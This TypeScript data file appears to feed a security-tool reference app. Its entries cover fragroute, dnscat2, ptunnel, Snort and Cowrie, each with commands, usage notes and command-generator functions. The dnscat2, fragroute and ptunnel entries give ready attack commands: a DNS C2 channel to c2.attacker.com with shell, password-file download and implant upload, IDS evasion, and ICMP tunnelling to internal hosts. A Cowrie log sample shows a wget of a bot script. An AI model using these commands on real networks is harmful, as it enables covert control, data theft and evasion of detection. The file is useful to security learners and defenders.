import type { Tool } from '../toolTypes';

export const evasionTools: Tool[] = [
  {
    id: 'fragroute',
    name: 'Fragroute',
    description: 'An advanced IDS/firewall evasion tool that intercepts, modifies, and rewrites outgoing network traffic. It can fragment packets, insert decoy data, reorder TCP segments, and perform TTL manipulation — making attacks essentially invisible to signature-based Network Intrusion Detection Systems (NIDS).',
    category: 'evasion-tools',
    difficulty: 'advanced',
    tags: ['ids-evasion', 'firewall', 'fragmentation', 'stealth', 'packets'],
    commands: [
      { command: 'fragroute -f fragroute.conf 192.168.1.100', description: 'Route all outbound traffic to 192.168.1.100 through the fragroute engine (applies rules from config)' },
      { command: 'echo "ip_frag 24" | fragroute 192.168.1.100', description: 'Fragment all IP packets to 24-byte fragments on the fly (IDS reassembly evasion)' },
      { command: 'echo "tcp_seg 8" | fragroute 192.168.1.100', description: 'Segment TCP data into 8-byte chunks to defeat TCP stream reassembly in IDS engines' },
      { command: 'echo "ip_chaff dup" | fragroute 192.168.1.100', description: 'Insert duplicate IP packets as chaff to confuse IDS correlation engines' },
      { command: 'echo "order random" | fragroute 192.168.1.100', description: 'Randomize the order of outgoing fragments to defeat ordered reassembly' },
    ],
    whenToUse: [
      'When a target IDS is blocking or alerting on your attack traffic and you need to evade signature detection',
      'To test the effectiveness of a Network Intrusion Prevention System (NIPS) against packet fragmentation attacks',
      'During advanced red team operations to make post-exploitation traffic blend with normal network noise',
      'To verify that IDS/IPS systems can properly reassemble fragmented and reordered packets',
    ],
    commonFlags: [
      { flag: '-f', description: 'Load a custom rule file defining the packet manipulation actions' },
      { flag: 'ip_frag', description: 'Rule: fragment IP packets to a specified size in bytes' },
      { flag: 'ip_chaff', description: 'Rule: insert decoy/junk packets into the stream to confuse IDS correlation' },
      { flag: 'tcp_seg', description: 'Rule: segment TCP data into smaller segments' },
      { flag: 'order random', description: 'Rule: randomize the order of fragments' },
      { flag: 'delay', description: 'Rule: add a delay between fragments (e.g., "delay 10" for 10ms)' },
      { flag: 'dup', description: 'Rule: duplicate packets before sending' },
    ],
    relatedTools: ['fragrouter', 'nmap', 'scapy'],
    installation: 'sudo apt install fragroute -y',
    website: 'https://github.com/mikeryan/fragroute',
    interactiveCommands: [
      {
        name: 'Fragroute IDS Evasion Builder',
        description: 'Generate advanced packet manipulation commands to evade Intrusion Detection Systems.',
        inputs: [
          { id: 'mode', label: 'Configuration Mode', type: 'select', options: ['Echo Rules (Inline)', 'Config File (-f)'], defaultValue: 'Echo Rules (Inline)' },
          { id: 'target', label: 'Target IP', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Destination IP address' },
          { id: 'ipFrag', label: 'IP Fragmentation', type: 'text', defaultValue: '24', placeholder: 'Fragment size in bytes' },
          { id: 'tcpSeg', label: 'TCP Segmentation', type: 'text', defaultValue: '8', placeholder: 'TCP segment size in bytes' },
          { id: 'chaff', label: 'Insert Chaff', type: 'select', options: ['None', 'ip_chaff dup', 'ip_chaff opt'], defaultValue: 'None' },
          { id: 'order', label: 'Packet Order', type: 'select', options: ['Sequential', 'order random', 'order reverse'], defaultValue: 'Sequential' },
          { id: 'delay', label: 'Delay (ms)', type: 'text', defaultValue: '', placeholder: 'e.g., 10' }
        ],
        generator: (inputs) => {
          if (inputs.mode === 'Config File (-f)') {
            return `fragroute -f fragroute.conf ${inputs.target}`;
          }
          
          let rules = [];
          if (inputs.ipFrag) rules.push(`ip_frag ${inputs.ipFrag}`);
          if (inputs.tcpSeg) rules.push(`tcp_seg ${inputs.tcpSeg}`);
          if (inputs.chaff !== 'None') rules.push(inputs.chaff);
          if (inputs.order !== 'Sequential') rules.push(inputs.order);
          if (inputs.delay) rules.push(`delay ${inputs.delay}`);
          
          if (rules.length === 0) return `fragroute ${inputs.target}`;
          
          return `echo "${rules.join('\\n')}" | fragroute ${inputs.target}`;
        }
      }
    ]
  },
  {
    id: 'dnscat2',
    name: 'Dnscat2',
    description: 'A powerful tool designed to create an encrypted C2 channel over DNS — the protocol that almost no firewall ever blocks. It creates a full bidirectional shell that tunnels all traffic through DNS queries (TXT records), making exfiltration and C2 communication nearly undetectable on strictly firewalled networks.',
    category: 'evasion-tools',
    difficulty: 'advanced',
    tags: ['dns', 'tunneling', 'c2', 'exfiltration', 'covert-channel', 'firewall-bypass'],
    commands: [
      { command: 'ruby dnscat2.rb --dns "domain=c2.attacker.com,host=0.0.0.0" --no-cache', description: 'Start the Dnscat2 server (attacker side) — requires you own the c2.attacker.com domain' },
      { command: './dnscat2 c2.attacker.com', description: 'Run the Dnscat2 client on the compromised host to establish the DNS tunnel' },
      { command: 'dnscat2> session -i 1', description: '(In server console) Interact with session 1' },
      { command: 'shell', description: '(In Dnscat2 session) Spawn an interactive command shell through the DNS tunnel' },
      { command: 'exec "powershell.exe"', description: '(In Dnscat2 session) Execute PowerShell on the Windows target' },
      { command: 'download C:\\Users\\admin\\Desktop\\passwords.xlsx /tmp/passwords.xlsx', description: '(In Dnscat2 session) Download a file from the target through the DNS channel' },
      { command: 'upload /tmp/implant.exe C:\\Windows\\Temp\\svc.exe', description: '(In Dnscat2 session) Upload a file to the target through the DNS channel' },
      { command: 'listen 127.0.0.1:4444 10.10.10.5:3389', description: '(In Dnscat2 session) Create a port forward: local 4444 -> remote RDP 3389 through the DNS tunnel' },
      { command: 'windows', description: '(In Dnscat2 session) List all active windows/subchannels' },
      { command: 'ruby dnscat2.rb --dns "domain=c2.attacker.com" --secret=mysecretkey', description: 'Start server with a shared secret for encrypted C2 communication' },
    ],
    whenToUse: [
      'When all common ports are blocked by strict egress firewalls, but DNS is allowed out (almost always)',
      'For establishing a persistent, encrypted C2 channel that bypasses DLP and firewall rules',
      'To exfiltrate data from air-gapped or heavily firewalled network segments via DNS queries',
      'For pivoting through DNS when SSH/HTTP/HTTPS tunnels are blocked by next-gen firewalls',
    ],
    commonFlags: [
      { flag: '--dns', description: 'Configure the DNS server settings (domain, host, port)' },
      { flag: '--secret', description: 'Set a shared secret for encrypting the C2 channel' },
      { flag: '--no-cache', description: 'Disable DNS caching (critical for interactive sessions)' },
      { flag: '--security', description: 'Set security level: open, encrypted, or authenticated' },
    ],
    outputExample: [
      '[*] Dnscat2 v0.07 started!',
      '[+] DNS server running on 0.0.0.0:53',
      '',
      '*** New session established: #1 ***',
      'Command session session established!',
      'dz> session -i 1',
      'dnscat2> shell',
      'Shell session established.',
      'C:\\Windows\\system32>whoami',
      'corp\\service-account'
    ],
    relatedTools: ['iodine', 'chisel', 'ptunnel', 'dnschef'],
    installation: 'gem install dnscat2   # Server: Ruby gem. Client: Compile from C source',
    website: 'https://github.com/iagox86/dnscat2',
    interactiveCommands: [
      {
        name: 'Dnscat2 C2 Tunnel Builder',
        description: 'Generate Dnscat2 server and client commands for robust encrypted DNS tunneling.',
        inputs: [
          { id: 'component', label: 'Component', type: 'select', options: ['Server (Ruby)', 'Client (C)', 'Session Console'], defaultValue: 'Server (Ruby)' },
          { id: 'domain', label: 'Your C2 Domain', type: 'text', defaultValue: 'c2.attacker.com', placeholder: 'Your DNS domain' },
          { id: 'secret', label: 'Shared Secret (--secret)', type: 'text', defaultValue: 'mysecretkey', placeholder: 'Key for encrypted tunnel' },
          { id: 'security', label: 'Security Level', type: 'select', options: ['authenticated', 'encrypted', 'open'], defaultValue: 'authenticated' },
          { id: 'noCache', label: 'No Cache (--no-cache)', type: 'checkbox', defaultValue: 'true', placeholder: 'Disable caching' },
          { id: 'port', label: 'Bind Port (--port)', type: 'text', defaultValue: '53', placeholder: 'Local port to listen on' }
        ],
        generator: (inputs) => {
          if (inputs.component === 'Session Console') {
            return `dnscat2> session -i 1\ndnscat2> shell\ndnscat2> listen 127.0.0.1:4444 10.10.10.5:3389`;
          }
          
          if (inputs.component === 'Client (C)') {
             return `./dnscat2 ${inputs.domain} --secret=${inputs.secret}`;
          }
          
          let cmd = `ruby dnscat2.rb --dns "domain=${inputs.domain},host=0.0.0.0,port=${inputs.port}"`;
          if (inputs.secret) cmd += ` --secret=${inputs.secret}`;
          if (inputs.security && inputs.security !== 'authenticated') cmd += ` --security=${inputs.security}`;
          if (inputs.noCache === 'true') cmd += ' --no-cache';
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'ptunnel',
    name: 'Ptunnel',
    description: 'Creates a TCP tunnel through ICMP (ping) packets. When TCP and UDP egress are fully blocked by a strict firewall but ICMP is allowed (for network monitoring), ptunnel lets you SSH, browse, or send any TCP data completely encapsulated inside ping packets.',
    category: 'evasion-tools',
    difficulty: 'intermediate',
    tags: ['tunneling', 'icmp', 'firewall-bypass', 'covert-channel'],
    commands: [
      { command: 'ptunnel -x password', description: 'Start the Ptunnel proxy server on the compromised/relay host (accessible via ICMP)' },
      { command: 'ptunnel -p relay.host -lp 8080 -da target.host -dp 22 -x password', description: 'On the attacker: forward local port 8080 through the ICMP tunnel to SSH on target' },
      { command: 'ssh user@localhost -p 8080', description: 'SSH through the established ICMP tunnel (connects via localhost:8080)' },
      { command: 'ptunnel -p relay.host -lp 3389 -da dc01.internal -dp 3389 -x password', description: 'Forward RDP through the ICMP tunnel to reach a domain controller' },
      { command: 'ptunnel -p relay.host -lp 1080 -da 0.0.0.0 -dp 1080 -x password', description: 'Create a SOCKS-like proxy over ICMP for general tunneling' },
    ],
    whenToUse: [
      'When TCP/UDP egress is fully blocked but ICMP (ping) is allowed through the firewall',
      'As a last-resort covert channel for pivoting in extremely locked-down environments',
      'To tunnel RDP, SSH, or HTTP through ICMP when no other protocol can egress the network',
    ],
    commonFlags: [
      { flag: '-p', description: 'Proxy/relay host (runs the ptunnel server)' },
      { flag: '-lp', description: 'Local port to listen on (attacker side)' },
      { flag: '-da', description: 'Destination address (the actual target)' },
      { flag: '-dp', description: 'Destination port on the target' },
      { flag: '-x', description: 'Password for basic authentication of the tunnel' },
      { flag: '-v', description: 'Verbosity level (-v, -vv, -vvv for max)' },
    ],
    outputExample: [
      '[inf]: Starting ptunnel-ng',
      '[inf]: Proxy will connect to: relay.host',
      '[inf]: Forwarding local port 8080 to target.host:22',
      '[inf]: Incoming connection from 127.0.0.1',
      '[inf]: Tunnel established via ICMP — transmitting data...',
    ],
    relatedTools: ['dnscat2', 'chisel', 'iodine'],
    installation: 'sudo apt install ptunnel -y',
    website: 'https://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/',
    interactiveCommands: [
      {
        name: 'ICMP Tunneling Orchestrator',
        description: 'Generate Ptunnel server and client commands to pivot TCP connections over Ping.',
        inputs: [
          { id: 'mode', label: 'Mode', type: 'select', options: ['Client (Forwarder)', 'Server (Proxy/Relay)'], defaultValue: 'Client (Forwarder)' },
          { id: 'relay', label: 'Relay Host IP (-p)', type: 'text', defaultValue: '10.10.10.1', placeholder: 'IP running ptunnel server' },
          { id: 'dest', label: 'Destination Host (-da)', type: 'text', defaultValue: '192.168.1.100', placeholder: 'Final target IP' },
          { id: 'destPort', label: 'Dest. Port (-dp)', type: 'text', defaultValue: '22', placeholder: '22 (SSH), 3389 (RDP)' },
          { id: 'localPort', label: 'Local Port (-lp)', type: 'text', defaultValue: '8080', placeholder: 'Port to bind locally' },
          { id: 'password', label: 'Password (-x)', type: 'text', defaultValue: 'secretpass', placeholder: 'Shared authentication password' },
          { id: 'verbose', label: 'Verbosity (-v)', type: 'select', options: ['None', '-v', '-vv', '-vvv'], defaultValue: '-v' }
        ],
        generator: (inputs) => {
          let cmd = 'ptunnel';
          
          if (inputs.password) cmd += ` -x ${inputs.password}`;
          if (inputs.verbose !== 'None') cmd += ` ${inputs.verbose}`;
          
          if (inputs.mode === 'Server (Proxy/Relay)') {
            return cmd;
          }
          
          cmd += ` -p ${inputs.relay} -lp ${inputs.localPort} -da ${inputs.dest} -dp ${inputs.destPort}`;
          
          return cmd + `\n\n# Connect using:\nssh user@localhost -p ${inputs.localPort}`;
        }
      }
    ]
  },
  {
    id: 'snort',
    name: 'Snort',
    description: 'The world\'s most widely deployed open-source IDS/IPS (Intrusion Detection/Prevention System). Uses rule-based language and protocol analysis to perform real-time traffic analysis and packet logging. Understanding Snort rules is essential for red teamers who need to evade detection.',
    category: 'evasion-tools',
    difficulty: 'advanced',
    tags: ['ids', 'ips', 'detection', 'rules', 'network-security'],
    commands: [
      { command: 'snort -i eth0 -c /etc/snort/snort.conf', description: 'Start Snort in IDS mode (alert mode), monitoring eth0 with the default ruleset' },
      { command: 'snort -i eth0 -c /etc/snort/snort.conf -A fast', description: 'Use fast alert mode (writes one alert line per triggering event)' },
      { command: 'snort -r capture.pcap -c /etc/snort/snort.conf', description: 'Analyze an existing PCAP file against Snort rules offline' },
      { command: 'snort -T -c /etc/snort/snort.conf', description: 'Test-mode: verify configuration file validity without starting capture' },
      { command: 'snort --daq-list', description: 'List all available Data Acquisition (DAQ) modules installed' },
    ],
    whenToUse: [
      'To set up a lab IDS to test if your attack payloads and techniques trigger known signatures',
      'During blue team exercises to detect and log attack patterns in real time',
      'To understand which Snort rules your techniques trip so you can craft evasion strategies',
    ],
    commonFlags: [
      { flag: '-i', description: 'Specify the network interface to listen on' },
      { flag: '-c', description: 'Path to the Snort configuration file' },
      { flag: '-A fast|full|none', description: 'Alert output mode' },
      { flag: '-r', description: 'Read from a PCAP file instead of live capture' },
      { flag: '-T', description: 'Test mode — validate config without capturing' },
      { flag: '-l', description: 'Log directory for alert and packet log files' },
    ],
    outputExample: [
      '   ,,_     -*> Snort! <*-',
      '  o"  )~  Version 3.1.50.0',
      '   \\\'\\\'\\\'\\\'    By Martin Roesch & The Snort Team',
      '',
      '01/04-12:00:01.123456  [**] [1:2001219:20] ET SCAN Nmap Scripting Engine User-Agent Detected [**]',
      '[Priority: 3]',
      '{TCP} 192.168.1.50:57890 -> 192.168.1.100:80'
    ],
    relatedTools: ['suricata', 'zeek', 'yara'],
    installation: 'sudo apt install snort -y',
    website: 'https://www.snort.org',
    interactiveCommands: [
      {
        name: 'Snort Execution Builder',
        description: 'Generate advanced Snort commands for packet capture, intrusion detection, and offline PCAP analysis.',
        inputs: [
          { id: 'mode', label: 'Operating Mode', type: 'select', options: ['IDS/IPS (Live)', 'Offline PCAP Analysis (-r)', 'Test Config (-T)'], defaultValue: 'IDS/IPS (Live)' },
          { id: 'interface', label: 'Interface (-i)', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0, ens33' },
          { id: 'config', label: 'Config File (-c)', type: 'text', defaultValue: '/etc/snort/snort.conf', placeholder: 'Path to snort.conf' },
          { id: 'pcap', label: 'PCAP File (-r)', type: 'text', defaultValue: 'capture.pcap', placeholder: 'Required for Offline Mode' },
          { id: 'alertMode', label: 'Alert Mode (-A)', type: 'select', options: ['fast', 'full', 'console', 'none'], defaultValue: 'fast' },
          { id: 'logDir', label: 'Log Directory (-l)', type: 'text', defaultValue: '/var/log/snort', placeholder: 'Directory for alerts/logs' },
          { id: 'daq', label: 'DAQ Module', type: 'text', defaultValue: '', placeholder: 'e.g., afpacket (for inline IPS)' }
        ],
        generator: (inputs) => {
          let cmd = 'snort';
          
          if (inputs.mode === 'Test Config (-T)') cmd += ' -T';
          
          if (inputs.config) cmd += ` -c ${inputs.config}`;
          if (inputs.alertMode !== 'full') cmd += ` -A ${inputs.alertMode}`;
          if (inputs.logDir) cmd += ` -l ${inputs.logDir}`;
          if (inputs.daq) cmd += ` --daq ${inputs.daq}`;
          
          if (inputs.mode === 'Offline PCAP Analysis (-r)') {
            cmd += ` -r ${inputs.pcap}`;
          } else {
            cmd += ` -i ${inputs.interface}`;
          }
          
          return cmd;
        }
      }
    ]
  },
  {
    id: 'cowrie',
    name: 'Cowrie Honeypot',
    description: 'A medium-to-high interaction SSH/Telnet honeypot designed to log brute force attacks and shell interaction performed by attackers. It emulates a Debian system and records every command typed, every file downloaded, and every privilege escalation attempt — providing invaluable threat intelligence.',
    category: 'evasion-tools',
    difficulty: 'intermediate',
    tags: ['honeypot', 'deception', 'threat-intelligence', 'ssh'],
    commands: [
      { command: 'bin/cowrie start', description: 'Start the Cowrie honeypot service (listens on port 2222 by default)' },
      { command: 'iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222', description: 'Redirect real SSH port 22 traffic to Cowrie on port 2222' },
      { command: 'tail -f var/log/cowrie/cowrie.log', description: 'Watch incoming attacker activity in real time' },
      { command: 'bin/cowrie stop', description: 'Stop the Cowrie service' },
    ],
    whenToUse: [
      'To capture and study attacker TTPs (Tactics, Techniques, Procedures) in the wild',
      'As a deception technology to detect and slow down lateral movement on internal networks',
      'To collect threat intelligence about automated attack tooling (botnets, worms)',
    ],
    commonFlags: [
      { flag: 'start', description: 'Start the honeypot' },
      { flag: 'stop', description: 'Stop the honeypot' },
      { flag: 'restart', description: 'Restart the honeypot' },
    ],
    outputExample: [
      '2026-04-26T12:00:01+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 203.0.113.5:44231 (192.168.1.1:2222)',
      '2026-04-26T12:00:02+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer] login attempt [b\'root\'/b\'admin\'] failed',
      '2026-04-26T12:00:03+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer] login attempt [b\'root\'/b\'password\'] succeeded',
      '2026-04-26T12:00:05+0000 [CowrieSSHChannel] CMD: wget http://malware-c2.com/bot.sh -O /tmp/.bot.sh',
      '2026-04-26T12:00:06+0000 [CowrieSSHChannel] Saved url http://malware-c2.com/bot.sh to /data/malware/bot.sh'
    ],
    relatedTools: ['kippo', 'dionaea', 'honeydb'],
    installation: 'git clone https://github.com/cowrie/cowrie.git && cd cowrie && pip3 install -r requirements.txt',
    website: 'https://github.com/cowrie/cowrie',
    interactiveCommands: [
      {
        name: 'Cowrie Honeypot Controller',
        description: 'Generate commands to start, stop, redirect traffic, and monitor the Cowrie honeypot.',
        inputs: [
          { id: 'action', label: 'Action', type: 'select', options: ['Start Cowrie', 'Stop Cowrie', 'Restart Cowrie', 'Setup Port Redirect (iptables)', 'Monitor Logs'], defaultValue: 'Start Cowrie' },
          { id: 'extPort', label: 'External SSH Port', type: 'text', defaultValue: '22', placeholder: 'Port attackers connect to' },
          { id: 'intPort', label: 'Cowrie Internal Port', type: 'text', defaultValue: '2222', placeholder: 'Port Cowrie listens on' },
          { id: 'interface', label: 'Network Interface', type: 'text', defaultValue: 'eth0', placeholder: 'e.g., eth0' }
        ],
        generator: (inputs) => {
          if (inputs.action === 'Start Cowrie') return 'bin/cowrie start';
          if (inputs.action === 'Stop Cowrie') return 'bin/cowrie stop';
          if (inputs.action === 'Restart Cowrie') return 'bin/cowrie restart';
          if (inputs.action === 'Monitor Logs') return 'tail -f var/log/cowrie/cowrie.log';
          
          if (inputs.action.includes('iptables')) {
            return `iptables -t nat -A PREROUTING -i ${inputs.interface} -p tcp --dport ${inputs.extPort} -j REDIRECT --to-port ${inputs.intPort}`;
          }
          
          return '';
        }
      }
    ]
  },
];
